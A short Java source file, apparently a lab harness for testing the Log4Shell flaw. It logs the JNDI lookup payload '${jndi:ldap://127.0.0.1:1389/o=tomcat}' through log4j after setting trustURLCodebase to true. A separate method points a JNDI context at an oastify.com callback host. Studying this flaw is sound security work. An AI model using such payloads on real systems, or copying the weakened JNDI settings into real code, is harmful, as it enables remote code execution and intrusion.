package com.mycompany.app;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.util.Properties; 
import java.util.Hashtable;
import javax.naming.*;
/**
 * Hello world!
 *
 */
public class App 
{
    static final Logger logger = LogManager.getLogger(App.class.getName());
    public static void main( String[] args )
    {
        System.out.println( "Hello World!" );
    }

    public static void jndi(){
        String name = ""; 
        String[] args = {"hi"};
        if (args.length > 0) 
            name = args[0]; 
        try { 
            // Create a Properties object and set properties appropriately 
            
            Properties props = new Properties(); 
            props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.fscontext.RefFSContextFactory"); 
            props.put(Context.PROVIDER_URL, "ldap://b2ehvc1n0g9osdyo1di6st431u7lvcj1.oastify.com"); 
            // Create the initial context from the properties we just created
            System.out.println("ctx");
            Context initialContext = new InitialContext(props); 
/*
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env.put(Context.PROVIDER_URL, "ldap://localhost:389/o=jnditutorial");
            System.out.println("make context");
            Context initialContext = new InitialContext(env);
*/
            // Look up the object 
            System.out.println("lookup");
            Object obj = initialContext.lookup(name); 
            if (name.equals(""))
                System.out.println("Looked up the initial context"); 
            else 
                System.out.println(name + " is bound to: " + obj); 
        } 
        catch (NamingException nnfe) { 
            System.out.println(nnfe);
            System.out.println("Encountered a naming exception"); 
            } 
    }

    public static void hi(){
        log();
        System.out.println("hi");
    }

    public static void log(){
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        System.out.println("trying to log?");
        String payload="${jndi:ldap://127.0.0.1:1389/o=tomcat}";
        logger.error(payload, "from log4j");
        System.out.println("logged");

    }
}
